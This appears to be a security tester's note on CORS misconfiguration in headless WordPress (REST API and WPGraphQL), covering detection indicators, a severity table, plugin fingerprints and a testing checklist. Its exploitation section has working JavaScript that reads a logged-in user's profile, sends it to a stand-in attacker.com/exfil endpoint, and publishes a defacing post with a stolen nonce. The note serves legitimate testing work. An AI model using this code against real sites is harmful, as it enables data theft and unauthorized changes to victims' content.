# WordPress Headless CMS — CORS Misconfiguration Pattern

## Context

When WordPress is used as a headless CMS backend (serving a decoupled frontend like Nuxt.js/React via REST API or WPGraphQL), CORS is often misconfigured to allow the frontend origin. Common plugins that introduce this:

- `headless-cms` (gsayed786) — sets permissive CORS on REST API
- WPGraphQL — sets `Access-Control-Allow-Origin: *` on /graphql by default
- Custom theme functions adding `rest_pre_serve_request` filters

## Detection

1. Check for headless indicators:
   - Default ACAO (no Origin header) points to a different domain (e.g., `https://www.example.com/blog`)
   - `X-Headless-CMS` custom header in CORS expose-headers
   - `X-WC-Session`, `X-WC-Cart-Totals` headers (WooCommerce headless)
   - `X-JWT-Refresh` header exposed (JWT auth plugin)
   - `/graphql` endpoint responding (WPGraphQL)

2. Test CORS on REST API vs GraphQL separately — they often have DIFFERENT policies:
   - REST API (`/wp-json/*`): Plugin-controlled, may reflect any origin + credentials
   - GraphQL (`/graphql`): WPGraphQL default is `ACAO: *` (no credentials, less dangerous)

## Exploitation (REST API reflected origin + credentials:true)

This is the HIGH-IMPACT variant. Browsers WILL send cookies with the request.

```javascript
// Attacker page — steal authenticated WP data
fetch('https://target-wp.com/wp-json/wp/v2/users/me', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  // Read authenticated user profile, email, capabilities
  fetch('https://attacker.com/exfil', {method:'POST', body:JSON.stringify(data)});
});

// Write operations also work (POST/PUT/DELETE allowed)
fetch('https://target-wp.com/wp-json/wp/v2/posts', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json', 'X-WP-Nonce': stolenNonce},
  body: JSON.stringify({title: 'Defaced', content: '...', status: 'publish'})
});
```

**Note:** Write operations via REST API require `X-WP-Nonce` header. The nonce can be obtained by first fetching any WP page (it's embedded in the HTML for logged-in users). With CORS + credentials, the attacker page can fetch the WP admin page, extract the nonce, then perform writes.

## Exploitation (GraphQL ACAO: * without credentials)

Lower impact — browsers won't send cookies with `ACAO: *`. However:
- If auth is via `Authorization: Bearer <token>` header (not cookies), the attacker needs the token first
- If introspection is enabled, full schema disclosure
- Public queries still work (user enumeration, content access)

## Severity Assessment

| Scenario | ACAO | Credentials | Severity |
|----------|------|-------------|----------|
| REST API reflects any origin + credentials:true | Reflected | true | Medium-High |
| REST API reflects *.domain.com + credentials:true | Subdomain | true | Medium (needs XSS on subdomain) |
| GraphQL ACAO: * (no credentials) | * | false | Low-Info |
| REST API reflects any origin, no credentials | Reflected | false | Low |

## Indicators of headless-cms plugin (gsayed786)

- Namespace: `rae/v1` (React App Engine)
- Endpoints: `/wp-json/rae/v1/cart/items`, `/wp-json/rae/v1/home`, `/wp-json/rae/v1/posts`
- WooCommerce dependency: calls `wc_get_product()`, `wc()` — if WC is missing, triggers 500 with full stack trace
- CORS headers include: `X-WC-Session`, `X-Headless-CMS`, `X-WC-Cart-Totals`, `X-WC-Cart-TotalItems`

## Stack Trace Disclosure (Bonus Finding)

When headless-cms plugin has WooCommerce dependency but WC is deactivated:
- POST/PUT/DELETE to `/wp-json/rae/v1/cart/items` → 500 with full PHP stack trace
- Leaks: server path (`/var/www/wordpress/`), plugin structure, class names, line numbers
- Indicates WP_DEBUG is enabled in production

## Testing Checklist

- [ ] Check CORS on `/wp-json/wp/v2/users` with `Origin: https://evil.com`
- [ ] Check CORS on `/graphql` with `Origin: https://evil.com` (often different policy)
- [ ] Check CORS with `Origin: null` (sandboxed iframe bypass)
- [ ] Check CORS with subdomain origin (e.g., `Origin: https://evil.target.com`)
- [ ] Verify `Access-Control-Allow-Credentials: true` presence
- [ ] Test if wp-login.php is behind separate auth (Cloudflare Access, IP allowlist)
- [ ] Test cart endpoints for stack trace disclosure
- [ ] Check for JWT auth plugin (`/wp-json/jwt-auth/v1/token`)
- [ ] Test GraphQL introspection (`{__schema{types{name}}}`)
- [ ] Test GraphQL mutations without auth
